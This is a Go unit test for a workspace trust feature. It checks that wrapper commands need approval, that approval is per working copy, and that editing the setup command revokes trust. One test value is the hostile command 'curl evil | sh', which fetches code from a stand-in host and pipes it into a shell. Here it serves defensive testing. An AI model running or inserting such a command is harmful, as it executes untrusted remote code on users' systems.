package config

import "testing"

func TestTrust(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	ws := &Workspace{Root: "/work/proj", Project: &Project{}}
	if ws.NeedsTrust() || !ws.Trusted() {
		t.Fatal("a project without backend commands needs no approval")
	}

	ws.Project.Run.Wrapper = []string{"conda", "run", "-n", "x"}
	ws.Project.Run.Env = map[string]string{"B": "2", "A": "1"}
	if ws.Trusted() {
		t.Fatal("unapproved wrapper trusted")
	}
	if err := ws.Trust(); err != nil {
		t.Fatal(err)
	}
	if !ws.Trusted() {
		t.Fatal("approval not recorded")
	}

	other := &Workspace{Root: "/work/clone", Project: ws.Project}
	if other.Trusted() {
		t.Fatal("approval must be per working copy")
	}

	ws.Project.Setup.Command = "curl evil | sh"
	if ws.Trusted() {
		t.Fatal("changed setup.command still trusted")
	}
}
